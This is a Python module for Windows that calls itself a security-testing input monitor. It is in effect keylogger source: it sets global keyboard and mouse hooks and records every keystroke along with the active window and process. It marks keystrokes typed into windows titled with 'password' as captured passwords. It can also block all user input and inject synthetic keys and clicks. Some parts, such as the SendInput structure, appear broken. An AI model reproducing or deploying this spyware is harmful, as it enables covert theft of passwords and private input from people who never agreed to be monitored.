"""
Input Monitoring Module for Security Testing
Comprehensive keyboard and mouse monitoring for vulnerability testing
"""

import ctypes
import ctypes.wintypes as wintypes
import threading
import time
import queue
from typing import Callable, Optional, Dict, List
from dataclasses import dataclass
from datetime import datetime
import logging

# Windows constants
WH_KEYBOARD_LL = 13
WH_MOUSE_LL = 14
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101
WM_SYSKEYDOWN = 0x0104
WM_SYSKEYUP = 0x0105

@dataclass
class InputEvent:
    """Captured input event"""
    event_type: str  # keyboard, mouse
    action: str      # keydown, keyup, click, move
    data: Dict
    timestamp: datetime
    process_name: Optional[str] = None
    window_title: Optional[str] = None

class InputMonitor:
    """Monitor all system input for security testing"""

    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.user32 = ctypes.windll.user32
        self.kernel32 = ctypes.windll.kernel32

        self.monitoring = False
        self.events = queue.Queue()
        self.callbacks = []

        # Hook handles
        self.keyboard_hook = None
        self.mouse_hook = None

        # Statistics
        self.stats = {
            'total_keystrokes': 0,
            'total_clicks': 0,
            'blocked_inputs': 0,
            'captured_passwords': 0
        }

    def start_monitoring(self, callback: Optional[Callable] = None) -> bool:
        """Start input monitoring"""
        if self.monitoring:
            return False

        if callback:
            self.callbacks.append(callback)

        self.monitoring = True

        # Start monitoring threads
        kbd_thread = threading.Thread(target=self._keyboard_monitor_thread)
        kbd_thread.daemon = True
        kbd_thread.start()

        mouse_thread = threading.Thread(target=self._mouse_monitor_thread)
        mouse_thread.daemon = True
        mouse_thread.start()

        self.logger.info("Input monitoring started")
        return True

    def _keyboard_monitor_thread(self):
        """Keyboard monitoring thread"""
        def low_level_keyboard_proc(nCode, wParam, lParam):
            if nCode >= 0:
                # Get keyboard data
                kb_data = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents

                # Get active window info
                hwnd = self.user32.GetForegroundWindow()
                window_title = self._get_window_title(hwnd)
                process_name = self._get_process_name(hwnd)

                # Create event
                event = InputEvent(
                    event_type='keyboard',
                    action='keydown' if wParam in [WM_KEYDOWN, WM_SYSKEYDOWN] else 'keyup',
                    data={
                        'vk_code': kb_data.vkCode,
                        'scan_code': kb_data.scanCode,
                        'flags': kb_data.flags,
                        'char': chr(kb_data.vkCode) if 32 <= kb_data.vkCode <= 126 else None,
                        'key_name': self._get_key_name(kb_data.vkCode)
                    },
                    timestamp=datetime.now(),
                    process_name=process_name,
                    window_title=window_title
                )

                # Queue event
                self.events.put(event)

                # Update stats
                if event.action == 'keydown':
                    self.stats['total_keystrokes'] += 1

                # Check for password fields
                if 'password' in window_title.lower():
                    self.stats['captured_passwords'] += 1
                    event.data['is_password'] = True

                # Notify callbacks
                for callback in self.callbacks:
                    try:
                        callback(event)
                    except:
                        pass

            # Call next hook
            return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)

        # Set up hook
        HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
        hook_proc = HOOKPROC(low_level_keyboard_proc)

        self.keyboard_hook = self.user32.SetWindowsHookExW(
            WH_KEYBOARD_LL,
            hook_proc,
            self.kernel32.GetModuleHandleW(None),
            0
        )

        # Message loop
        msg = wintypes.MSG()
        while self.monitoring:
            bRet = self.user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
            if bRet == 0:
                break
            elif bRet == -1:
                continue
            else:
                self.user32.TranslateMessage(ctypes.byref(msg))
                self.user32.DispatchMessageW(ctypes.byref(msg))

        # Unhook
        if self.keyboard_hook:
            self.user32.UnhookWindowsHookEx(self.keyboard_hook)

    def _mouse_monitor_thread(self):
        """Mouse monitoring thread"""
        def low_level_mouse_proc(nCode, wParam, lParam):
            if nCode >= 0:
                # Get mouse data
                mouse_data = ctypes.cast(lParam, ctypes.POINTER(MSLLHOOKSTRUCT)).contents

                # Determine action
                actions = {
                    0x0200: 'move',
                    0x0201: 'lbutton_down',
                    0x0202: 'lbutton_up',
                    0x0204: 'rbutton_down',
                    0x0205: 'rbutton_up',
                    0x0207: 'mbutton_down',
                    0x0208: 'mbutton_up',
                    0x020A: 'wheel'
                }

                action = actions.get(wParam, 'unknown')

                # Get window under cursor
                hwnd = self.user32.WindowFromPoint(mouse_data.pt)
                window_title = self._get_window_title(hwnd)

                # Create event
                event = InputEvent(
                    event_type='mouse',
                    action=action,
                    data={
                        'x': mouse_data.pt.x,
                        'y': mouse_data.pt.y,
                        'wheel_delta': mouse_data.mouseData if action == 'wheel' else None
                    },
                    timestamp=datetime.now(),
                    window_title=window_title
                )

                # Queue event
                self.events.put(event)

                # Update stats
                if 'button_down' in action:
                    self.stats['total_clicks'] += 1

                # Notify callbacks
                for callback in self.callbacks:
                    try:
                        callback(event)
                    except:
                        pass

            return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)

        # Set up hook
        HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
        hook_proc = HOOKPROC(low_level_mouse_proc)

        self.mouse_hook = self.user32.SetWindowsHookExW(
            WH_MOUSE_LL,
            hook_proc,
            self.kernel32.GetModuleHandleW(None),
            0
        )

        # Message loop
        msg = wintypes.MSG()
        while self.monitoring:
            bRet = self.user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
            if bRet == 0:
                break
            elif bRet == -1:
                continue
            else:
                self.user32.TranslateMessage(ctypes.byref(msg))
                self.user32.DispatchMessageW(ctypes.byref(msg))

        # Unhook
        if self.mouse_hook:
            self.user32.UnhookWindowsHookEx(self.mouse_hook)

    def stop_monitoring(self):
        """Stop input monitoring"""
        self.monitoring = False

        # Post quit message to break message loops
        self.user32.PostQuitMessage(0)

        self.logger.info(f"Input monitoring stopped. Stats: {self.stats}")

    def get_events(self, max_count: int = 100) -> List[InputEvent]:
        """Get captured events"""
        events = []
        try:
            for _ in range(max_count):
                events.append(self.events.get_nowait())
        except queue.Empty:
            pass
        return events

    def block_input(self, block: bool = True) -> bool:
        """Block all input (for testing protection bypass)"""
        return bool(self.user32.BlockInput(block))

    def simulate_input(self, input_type: str, **kwargs) -> bool:
        """Simulate input events for testing"""
        if input_type == 'keyboard':
            return self._simulate_keyboard(**kwargs)
        elif input_type == 'mouse':
            return self._simulate_mouse(**kwargs)
        return False

    def _simulate_keyboard(self, key: int, action: str = 'press') -> bool:
        """Simulate keyboard input"""
        INPUT = ctypes.c_ulong
        KEYBDINPUT = ctypes.c_ushort * 4

        if action == 'press':
            # Key down
            ki = KEYBDINPUT(key, 0, 0, 0)
            self.user32.SendInput(1, ctypes.byref(ki), ctypes.sizeof(ki))
            # Key up
            ki = KEYBDINPUT(key, 0, 2, 0)  # KEYEVENTF_KEYUP = 2
            self.user32.SendInput(1, ctypes.byref(ki), ctypes.sizeof(ki))
            return True
        return False

    def _simulate_mouse(self, x: int, y: int, action: str = 'move') -> bool:
        """Simulate mouse input"""
        if action == 'move':
            return bool(self.user32.SetCursorPos(x, y))
        elif action == 'click':
            # Move to position
            self.user32.SetCursorPos(x, y)
            # Click
            self.user32.mouse_event(2, 0, 0, 0, 0)  # Left down
            self.user32.mouse_event(4, 0, 0, 0, 0)  # Left up
            return True
        return False

    def _get_window_title(self, hwnd: int) -> str:
        """Get window title from handle"""
        length = self.user32.GetWindowTextLengthW(hwnd) + 1
        title = ctypes.create_unicode_buffer(length)
        self.user32.GetWindowTextW(hwnd, title, length)
        return title.value

    def _get_process_name(self, hwnd: int) -> str:
        """Get process name from window handle"""
        try:
            pid = wintypes.DWORD()
            self.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))

            # Open process
            PROCESS_QUERY_INFORMATION = 0x0400
            h_process = self.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)

            if h_process:
                exe_name = ctypes.create_unicode_buffer(260)
                size = wintypes.DWORD(260)
                if self.kernel32.QueryFullProcessImageNameW(h_process, 0, exe_name, ctypes.byref(size)):
                    self.kernel32.CloseHandle(h_process)
                    return exe_name.value.split('\\')[-1]
                self.kernel32.CloseHandle(h_process)
        except:
            pass
        return "unknown"

    def _get_key_name(self, vk_code: int) -> str:
        """Get key name from virtual key code"""
        key_names = {
            0x08: 'BACKSPACE', 0x09: 'TAB', 0x0D: 'ENTER', 0x1B: 'ESC',
            0x20: 'SPACE', 0x21: 'PAGEUP', 0x22: 'PAGEDOWN', 0x23: 'END',
            0x24: 'HOME', 0x25: 'LEFT', 0x26: 'UP', 0x27: 'RIGHT',
            0x28: 'DOWN', 0x2E: 'DELETE', 0x5B: 'LWIN', 0x5C: 'RWIN',
            0x70: 'F1', 0x71: 'F2', 0x72: 'F3', 0x73: 'F4',
            0x74: 'F5', 0x75: 'F6', 0x76: 'F7', 0x77: 'F8',
            0x78: 'F9', 0x79: 'F10', 0x7A: 'F11', 0x7B: 'F12',
            0xA0: 'LSHIFT', 0xA1: 'RSHIFT', 0xA2: 'LCTRL', 0xA3: 'RCTRL',
            0xA4: 'LALT', 0xA5: 'RALT'
        }
        return key_names.get(vk_code, f'VK_{vk_code:02X}')


# Hook structures
class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ('vkCode', wintypes.DWORD),
        ('scanCode', wintypes.DWORD),
        ('flags', wintypes.DWORD),
        ('time', wintypes.DWORD),
        ('dwExtraInfo', ctypes.POINTER(ctypes.c_ulong))
    ]

class MSLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ('pt', wintypes.POINT),
        ('mouseData', wintypes.DWORD),
        ('flags', wintypes.DWORD),
        ('time', wintypes.DWORD),
        ('dwExtraInfo', ctypes.POINTER(ctypes.c_ulong))
    ]